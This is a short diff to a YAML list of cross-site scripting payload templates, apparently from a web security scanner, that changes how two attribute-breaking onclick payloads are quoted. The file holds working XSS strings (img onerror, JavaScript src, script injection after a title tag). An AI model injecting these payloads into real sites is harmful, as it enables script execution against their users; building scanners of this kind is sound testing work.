@@ -6,5 +6,5 @@ xss_payloads:
     image_onerror: <img src=x onerror=%2$s id=%1$s>
     image_src: <IMG SRC=JaVaScRiPt:%2$s id=%1$s>
     title: </TITLE><SCRIPT id=%1$s>%2$s</script>
-    break_attribute_single_quote: ''' x=%1$s onclick="%2$s" \'
-    break_attribute_double_quote: '" x=%1$s onclick="%2$s" \'
+    break_attribute_single_quote: ''' x=%1$s onclick=%2$s \'
+    break_attribute_double_quote: '" x=%1$s onclick=%2$s \'
